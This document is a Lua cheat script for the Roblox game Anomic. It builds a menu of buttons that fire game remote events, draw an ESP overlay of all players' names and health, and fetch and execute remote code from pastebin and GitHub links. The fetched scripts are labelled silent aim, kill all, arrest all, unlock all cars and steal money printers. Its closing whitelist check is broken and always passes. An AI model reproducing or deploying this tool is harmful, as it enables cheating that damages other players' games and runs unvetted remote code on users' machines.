-- Gui Made By Greg35g35 Arrosz

local AnomicAlpha = Instance.new("ScreenGui")
local Open = Instance.new("TextButton")
local PrimeiraGui = Instance.new("Frame")
local Droped = Instance.new("TextButton")
local Silent = Instance.new("TextButton")
local Hide = Instance.new("TextButton")
local ESP = Instance.new("TextButton")
local CreatorArrosz2 = Instance.new("TextLabel")
local ImageLabel = Instance.new("ImageLabel")
local Close = Instance.new("TextButton")
local InfiniteYield = Instance.new("TextButton")
local KillAll = Instance.new("TextButton")
local ImageLabel_2 = Instance.new("ImageLabel")
local ImageLabel_3 = Instance.new("ImageLabel")
local UnlockCar = Instance.new("TextButton")
local Money = Instance.new("TextButton")
local Made = Instance.new("TextLabel")
local HealAll = Instance.new("TextButton")
local ArrestAll = Instance.new("TextButton")
local OpenCloseDoors = Instance.new("TextButton")
local UnlockDoors = Instance.new("TextButton")

AnomicAlpha.Name = "Anomic Alpha"
AnomicAlpha.Parent = game.CoreGui
AnomicAlpha.ResetOnSpawn = false

Open.Name = "Open"
Open.Parent = AnomicAlpha
Open.BackgroundColor3 = Color3.fromRGB(38, 38, 38)
Open.BorderColor3 = Color3.fromRGB(25, 25, 25)
Open.Position = UDim2.new(0.0245613083, 0, 0.920355141, 0)
Open.Size = UDim2.new(0, 45, 0, 20)
Open.Font = Enum.Font.SourceSans
Open.Text = "Open"
Open.TextColor3 = Color3.fromRGB(15, 15, 15)
Open.TextSize = 14.000
Open.Visible = true
Open.MouseButton1Down:connect(function()
	PrimeiraGui.Visible = true
end)

PrimeiraGui.Name = "PrimeiraGui"
PrimeiraGui.Parent = AnomicAlpha
PrimeiraGui.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
PrimeiraGui.BorderColor3 = Color3.fromRGB(25, 25, 25)
PrimeiraGui.Position = UDim2.new(0.368883312, 0, 0.142903879, 0)
PrimeiraGui.Size = UDim2.new(0, 281, 0, 352)
PrimeiraGui.Visible = false
PrimeiraGui.Selectable = true
PrimeiraGui.Draggable = true
PrimeiraGui.Active = true

Droped.Name = "Droped"
Droped.Parent = PrimeiraGui
Droped.BackgroundColor3 = Color3.fromRGB(38, 38, 38)
Droped.BorderColor3 = Color3.fromRGB(25, 25, 25)
Droped.Position = UDim2.new(0.044031851, 0, 0.16372706, 0)
Droped.Size = UDim2.new(0, 110, 0, 43)
Droped.Font = Enum.Font.SourceSansSemibold
Droped.Text = "Get Droped Items"
Droped.TextColor3 = Color3.fromRGB(15, 15, 15)
Droped.TextSize = 14.000
Droped.MouseButton1Down:connect(function()
local A_1 = game:GetService("Workspace").Entities.ToolModel
local A_2 = "PickUp"
local Event = game:GetService("ReplicatedStorage")["_CS.Events"].Dropper
Event:FireServer(A_1, A_2)
end)

Silent.Name = "Silent"
Silent.Parent = PrimeiraGui
Silent.BackgroundColor3 = Color3.fromRGB(38, 38, 38)
Silent.BorderColor3 = Color3.fromRGB(25, 25, 25)
Silent.Position = UDim2.new(0.044216387, 0, 0.307971209, 0)
Silent.Size = UDim2.new(0, 251, 0, 43)
Silent.Font = Enum.Font.SourceSansSemibold
Silent.Text = "Silent Aim, Unlimited Ammo + Stamina"
Silent.TextColor3 = Color3.fromRGB(15, 15, 15)
Silent.TextSize = 14.000
Silent.MouseButton1Down:connect(function()
loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Stefanuk12/ROBLOX/master/Games/Anomic/Main.lua"))()
end)

Hide.Name = "Hide"
Hide.Parent = PrimeiraGui
Hide.BackgroundColor3 = Color3.fromRGB(38, 38, 38)
Hide.BorderColor3 = Color3.fromRGB(25, 25, 25)
Hide.Position = UDim2.new(0.547897637, 0, 0.457486242, 0)
Hide.Size = UDim2.new(0, 56, 0, 42)
Hide.Font = Enum.Font.SourceSansSemibold
Hide.Text = "Hide Name"
Hide.TextColor3 = Color3.fromRGB(15, 15, 15)
Hide.TextSize = 14.000
Hide.MouseButton1Down:connect(function()
game.Workspace.RayIgnore[game:GetService("Players").LocalPlayer.Name].Head.PlayerDisplay:Destroy()
end)

ESP.Name = "ESP"
ESP.Parent = PrimeiraGui
ESP.BackgroundColor3 = Color3.fromRGB(38, 38, 38)
ESP.BorderColor3 = Color3.fromRGB(25, 25, 25)
ESP.Position = UDim2.new(0.044216387, 0, 0.457486242, 0)
ESP.Size = UDim2.new(0, 31, 0, 42)
ESP.Font = Enum.Font.SourceSansSemibold
ESP.Text = "Esp"
ESP.TextColor3 = Color3.fromRGB(15, 15, 15)
ESP.TextSize = 14.000
ESP.MouseButton1Down:connect(function()
local Holder = Instance.new("Folder", game.CoreGui)
Holder.Name = "ESP"

local Box = Instance.new("BoxHandleAdornment")
Box.Name = "nilBox"
Box.Size = Vector3.new(4, 7, 4)
Box.Color3 = Color3.new(100 / 255, 100 / 255, 100 / 255)
Box.Transparency = 0.7
Box.ZIndex = 0
Box.AlwaysOnTop = true
Box.Visible = true

local NameTag = Instance.new("BillboardGui")
NameTag.Name = "nilNameTag"
NameTag.Enabled = false
NameTag.Size = UDim2.new(0, 200, 0, 50)
NameTag.AlwaysOnTop = true
NameTag.StudsOffset = Vector3.new(0, 1.8, 0)
local Tag = Instance.new("TextLabel", NameTag)
Tag.Name = "Tag"
Tag.BackgroundTransparency = 1
Tag.Position = UDim2.new(0, -50, 0, 0)
Tag.Size = UDim2.new(0, 300, 0, 20)
Tag.TextSize = 20
Tag.TextColor3 = Color3.new(100 / 255, 100 / 255, 100 / 255)
Tag.TextStrokeColor3 = Color3.new(0 / 255, 0 / 255, 0 / 255)
Tag.TextStrokeTransparency = 0.4
Tag.Text = "nil"
Tag.Font = Enum.Font.SourceSansBold
Tag.TextScaled = false

local LoadCharacter = function(v)
	repeat wait() until v.Character ~= nil
	v.Character:WaitForChild("Humanoid")
	local vHolder = Holder:FindFirstChild(v.Name)
	vHolder:ClearAllChildren()
	local b = Box:Clone()
	b.Name = v.Name .. "Box"
	b.Adornee = v.Character
	b.Parent = vHolder
	local t = NameTag:Clone()
	t.Name = v.Name .. "NameTag"
	t.Enabled = true
	t.Parent = vHolder
	t.Adornee = v.Character:WaitForChild("Head", 5)
	if not t.Adornee then
		return UnloadCharacter(v)
	end
	t.Tag.Text = v.Name
	b.Color3 = Color3.new(v.TeamColor.r, v.TeamColor.g, v.TeamColor.b)
	t.Tag.TextColor3 = Color3.new(v.TeamColor.r, v.TeamColor.g, v.TeamColor.b)
	local Update
	local UpdateNameTag = function()
		if not pcall(function()
			v.Character.Humanoid.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None
			local maxh = math.floor(v.Character.Humanoid.MaxHealth)
			local h = math.floor(v.Character.Humanoid.Health)
			t.Tag.Text = v.Name .. "\n" .. ((maxh ~= 0 and tostring(math.floor((h / maxh) * 100))) or "0") .. "%  " .. tostring(h) .. "/" .. tostring(maxh)
		end) then
			Update:Disconnect()
		end
	end
	UpdateNameTag()
	Update = v.Character.Humanoid.Changed:Connect(UpdateNameTag)
end

local UnloadCharacter = function(v)
	local vHolder = Holder:FindFirstChild(v.Name)
	if vHolder and (vHolder:FindFirstChild(v.Name .. "Box") ~= nil or vHolder:FindFirstChild(v.Name .. "NameTag") ~= nil) then
		vHolder:ClearAllChildren()
	end
end

local LoadPlayer = function(v)
	local vHolder = Instance.new("Folder", Holder)
	vHolder.Name = v.Name
	v.CharacterAdded:Connect(function()
		pcall(LoadCharacter, v)
	end)
	v.CharacterRemoving:Connect(function()
		pcall(UnloadCharacter, v)
	end)
	v.Changed:Connect(function(prop)
		if prop == "TeamColor" then
			UnloadCharacter(v)
			wait()
			LoadCharacter(v)
		end
	end)
	LoadCharacter(v)
end

local UnloadPlayer = function(v)
	UnloadCharacter(v)
	local vHolder = Holder:FindFirstChild(v.Name)
	if vHolder then
		vHolder:Destroy()
	end
end

for i,v in pairs(game:GetService("Players"):GetPlayers()) do
	spawn(function() pcall(LoadPlayer, v) end)
end

game:GetService("Players").PlayerAdded:Connect(function(v)
	pcall(LoadPlayer, v)
end)

game:GetService("Players").PlayerRemoving:Connect(function(v)
	pcall(UnloadPlayer, v)
end)

game:GetService("Players").LocalPlayer.NameDisplayDistance = 0
end)

CreatorArrosz2.Name = "CreatorArrosz2"
CreatorArrosz2.Parent = PrimeiraGui
CreatorArrosz2.BackgroundColor3 = Color3.fromRGB(38, 38, 38)
CreatorArrosz2.BorderColor3 = Color3.fromRGB(25, 25, 25)
CreatorArrosz2.Position = UDim2.new(0.0440091714, 0, 0.0132693807, 0)
CreatorArrosz2.Size = UDim2.new(0, 252, 0, 43)
CreatorArrosz2.Font = Enum.Font.Gotham
CreatorArrosz2.Text = "Rice's Gui V1.0"
CreatorArrosz2.TextColor3 = Color3.fromRGB(5, 5, 5)
CreatorArrosz2.TextSize = 14.000

ImageLabel.Parent = PrimeiraGui
ImageLabel.BackgroundColor3 = Color3.fromRGB(38, 38, 38)
ImageLabel.BorderColor3 = Color3.fromRGB(38, 38, 38)
ImageLabel.Position = UDim2.new(0.457595587, 0, 0.852208376, 0)
ImageLabel.Size = UDim2.new(0, 22, 0, 21)
ImageLabel.Image = "http://www.roblox.com/asset/?id=46919173"

Close.Name = "Close"
Close.Parent = PrimeiraGui
Close.BackgroundColor3 = Color3.fromRGB(38, 38, 38)
Close.BorderColor3 = Color3.fromRGB(25, 25, 25)
Close.Position = UDim2.new(0.0442163423, 0, 0.914349139, 0)
Close.Size = UDim2.new(0, 254, 0, 19)
Close.Font = Enum.Font.SourceSansSemibold
Close.Text = "Close"
Close.TextColor3 = Color3.fromRGB(15, 15, 15)
Close.TextSize = 14.000
Close.MouseButton1Down:connect(function()
	PrimeiraGui.Visible = false
end)

InfiniteYield.Name = "InfiniteYield"
InfiniteYield.Parent = PrimeiraGui
InfiniteYield.BackgroundColor3 = Color3.fromRGB(38, 38, 38)
InfiniteYield.BorderColor3 = Color3.fromRGB(25, 25, 25)
InfiniteYield.Position = UDim2.new(0.547897637, 0, 0.610371768, 0)
InfiniteYield.Size = UDim2.new(0, 111, 0, 41)
InfiniteYield.Font = Enum.Font.SourceSansSemibold
InfiniteYield.Text = "Infinite Yield"
InfiniteYield.TextColor3 = Color3.fromRGB(15, 15, 15)
InfiniteYield.TextSize = 14.000
InfiniteYield.MouseButton1Down:connect(function()
loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()
end)

KillAll.Name = "KillAll"
KillAll.Parent = PrimeiraGui
KillAll.BackgroundColor3 = Color3.fromRGB(38, 38, 38)
KillAll.BorderColor3 = Color3.fromRGB(25, 25, 25)
KillAll.Position = UDim2.new(0.7737692, 0, 0.456962675, 0)
KillAll.Size = UDim2.new(0, 46, 0, 42)
KillAll.Font = Enum.Font.SourceSansSemibold
KillAll.Text = "Kill All"
KillAll.TextColor3 = Color3.fromRGB(15, 15, 15)
KillAll.TextSize = 14.000
KillAll.MouseButton1Down:connect(function()
loadstring(game:HttpGet('https://pastebin.com/raw/MB12F9Ec'))()
end)

ImageLabel_2.Parent = PrimeiraGui
ImageLabel_2.BackgroundColor3 = Color3.fromRGB(38, 38, 38)
ImageLabel_2.BorderColor3 = Color3.fromRGB(38, 38, 38)
ImageLabel_2.Position = UDim2.new(0.118434787, 0, 0.045390185, 0)
ImageLabel_2.Size = UDim2.new(0, 22, 0, 21)
ImageLabel_2.Image = "http://www.roblox.com/asset/?id=46919173"

ImageLabel_3.Parent = PrimeiraGui
ImageLabel_3.BackgroundColor3 = Color3.fromRGB(38, 38, 38)
ImageLabel_3.BorderColor3 = Color3.fromRGB(38, 38, 38)
ImageLabel_3.Position = UDim2.new(0.796756446, 0, 0.0453901887, 0)
ImageLabel_3.Size = UDim2.new(0, 22, 0, 21)
ImageLabel_3.Image = "http://www.roblox.com/asset/?id=46919173"

UnlockCar.Name = "UnlockCar"
UnlockCar.Parent = PrimeiraGui
UnlockCar.BackgroundColor3 = Color3.fromRGB(38, 38, 38)
UnlockCar.BorderColor3 = Color3.fromRGB(25, 25, 25)
UnlockCar.Position = UDim2.new(0.044216387, 0, 0.752417147, 0)
UnlockCar.Size = UDim2.new(0, 109, 0, 40)
UnlockCar.Font = Enum.Font.SourceSansSemibold
UnlockCar.Text = "Unlock All Cars"
UnlockCar.TextColor3 = Color3.fromRGB(15, 15, 15)
UnlockCar.TextSize = 14.000
UnlockCar.MouseButton1Down:connect(function()
loadstring(game:HttpGet("https://pastebin.com/raw/CyuiwQ6a", true))()
end)

Money.Name = "Money"
Money.Parent = PrimeiraGui
Money.BackgroundColor3 = Color3.fromRGB(38, 38, 38)
Money.BorderColor3 = Color3.fromRGB(25, 25, 25)
Money.Position = UDim2.new(0.55120939, 0, 0.752417207, 0)
Money.Size = UDim2.new(0, 110, 0, 40)
Money.Font = Enum.Font.SourceSansSemibold
Money.Text = "Steal Money Printers"
Money.TextColor3 = Color3.fromRGB(15, 15, 15)
Money.TextSize = 14.000
Money.MouseButton1Down:connect(function()
loadstring(game:HttpGet("https://pastebin.com/raw/nQryZVeb", true))()
end)

Made.Name = "Made"
Made.Parent = PrimeiraGui
Made.BackgroundColor3 = Color3.fromRGB(38, 38, 38)
Made.BorderColor3 = Color3.fromRGB(25, 25, 25)
Made.Position = UDim2.new(0.257381529, 0, 0.997648954, 0)
Made.Size = UDim2.new(0, 138, 0, 31)
Made.Font = Enum.Font.SourceSans
Made.Text = "Gui Made By Greg35g35"
Made.TextColor3 = Color3.fromRGB(15, 15, 15)
Made.TextSize = 14.000

HealAll.Name = "Heal All"
HealAll.Parent = PrimeiraGui
HealAll.BackgroundColor3 = Color3.fromRGB(38, 38, 38)
HealAll.BorderColor3 = Color3.fromRGB(25, 25, 25)
HealAll.Position = UDim2.new(0.0440319553, 0, 0.606908858, 0)
HealAll.Size = UDim2.new(0, 43, 0, 41)
HealAll.Font = Enum.Font.SourceSansSemibold
HealAll.Text = "Heal All"
HealAll.TextColor3 = Color3.fromRGB(15, 15, 15)
HealAll.TextSize = 14.000
HealAll.MouseButton1Down:connect(function()
loadstring(game:HttpGet('https://pastebin.com/raw/YpJ1cwLb'))()
end)

ArrestAll.Name = "Arrest All"
ArrestAll.Parent = PrimeiraGui
ArrestAll.BackgroundColor3 = Color3.fromRGB(38, 38, 38)
ArrestAll.BorderColor3 = Color3.fromRGB(25, 25, 25)
ArrestAll.Position = UDim2.new(0.225726366, 0, 0.606908858, 0)
ArrestAll.Size = UDim2.new(0, 58, 0, 41)
ArrestAll.Font = Enum.Font.SourceSansSemibold
ArrestAll.Text = "Arrest All"
ArrestAll.TextColor3 = Color3.fromRGB(15, 15, 15)
ArrestAll.TextSize = 14.000
ArrestAll.MouseButton1Down:connect(function()
loadstring(game:HttpGet('https://pastebin.com/raw/dvzD2bVR'))()
end)

OpenCloseDoors.Name = "Open/CloseDoors"
OpenCloseDoors.Parent = PrimeiraGui
OpenCloseDoors.BackgroundColor3 = Color3.fromRGB(38, 38, 38)
OpenCloseDoors.BorderColor3 = Color3.fromRGB(25, 25, 25)
OpenCloseDoors.Position = UDim2.new(0.551024854, 0, 0.16372706, 0)
OpenCloseDoors.Size = UDim2.new(0, 110, 0, 43)
OpenCloseDoors.Font = Enum.Font.SourceSansSemibold
OpenCloseDoors.Text = "Open/Close Doors"
OpenCloseDoors.TextColor3 = Color3.fromRGB(15, 15, 15)
OpenCloseDoors.TextSize = 14.000
OpenCloseDoors.MouseButton1Down:connect(function()
loadstring(game:HttpGet('https://pastebin.com/raw/pZ3Lp250'))()
end)

UnlockDoors.Name = "Droped"
UnlockDoors.Parent = PrimeiraGui
UnlockDoors.BackgroundColor3 = Color3.fromRGB(38, 38, 38)
UnlockDoors.BorderColor3 = Color3.fromRGB(25, 25, 25)
UnlockDoors.Position = UDim2.new(0.182821795, 0, 0.457486242, 0)
UnlockDoors.Size = UDim2.new(0, 70, 0, 42)
UnlockDoors.Font = Enum.Font.SourceSansSemibold
UnlockDoors.Text = "Unlock Doors"
UnlockDoors.TextColor3 = Color3.fromRGB(15, 15, 15)
UnlockDoors.TextSize = 14.000
UnlockDoors.MouseButton1Down:connect(function()
loadstring(game:HttpGet('https://pastebin.com/raw/N69RAMi7'))()
end)

local function SVGJMUR_fake_script() -- AnomicAlpha.LocalScript 
	local script = Instance.new('LocalScript', AnomicAlpha)

	while true do
		if game.Players.LocalPlayer.Name == "Plsgivemeskinslol" or "" then
			wait()
		else
			game.Players.LocalPlayer:kick("You are not Whitelisted")
			script.Parent:Destroy()
		end
	end
end
coroutine.wrap(SVGJMUR_fake_script)()
